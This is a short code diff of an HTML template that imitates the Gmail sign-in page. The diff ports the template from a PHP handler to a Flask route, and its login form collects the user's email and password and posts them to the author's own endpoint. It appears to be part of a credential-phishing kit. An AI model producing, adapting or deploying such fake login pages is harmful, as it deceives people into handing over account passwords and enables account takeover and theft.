@@ -2,7 +2,7 @@
 
 <head>
   <title>Gmail</title>
-  <link rel="stylesheet" href="style.css">
+  <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
 </head>
 
 <body>
@@ -22,9 +22,9 @@
         </h2>
       </div>
       <div class="card signin-card clearfix">
-        <img class="profile-img" src="https://i.imgur.com/9r33ioA.png" alt="">
+          <img class="profile-img" src="{{ url_for('static', filename='img/profile.png') }}" alt="">
         <p class="profile-name"></p>
-        <form novalidate="" id="gaia_loginform" action="login.php" method="post">
+        <form novalidate="" id="gaia_loginform" action="{{ url_for('handle_data') }}" method="post">
           <input id="Email" name="Email" type="email" placeholder="Email" value="" spellcheck="false" class="">
           <input id="Passwd" name="Passwd" type="password" placeholder="Password" class="passwd-label">
           <input id="signIn" name="signIn" class="rc-button rc-button-submit" type="submit" value="Sign in">
